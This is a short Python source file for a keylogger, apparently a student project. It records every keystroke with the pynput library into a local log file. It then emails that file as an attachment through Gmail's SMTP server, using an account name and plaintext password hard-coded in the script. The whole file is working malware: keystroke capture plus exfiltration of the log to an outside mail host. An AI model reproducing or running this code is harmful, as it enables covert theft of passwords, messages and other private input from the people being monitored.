from email import encoders
from email.mime.base import MIMEBase

import pynput
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener
import logging

#log_directory = ""
logging.basicConfig(filename="log_results.txt", level=logging.DEBUG)

sender_email = "tnm031keylogger@gmail.com"
receiver_email = "tnm031keylogger@gmail.com"
password = "tnm031pizza"
filename = "log_results.txt"
subject = "Keys logged"
body = "This is an email with attachment sent from Python"

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject

message.attach(MIMEText(body, "plain"))

with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

encoders.encode_base64(part)

message.attach(part)
text = message.as_string()

context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)

def keypress(key):
    logging.info(str(key))
    print(key);

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    with Listener(on_press=keypress) as listener:
        listener.join()

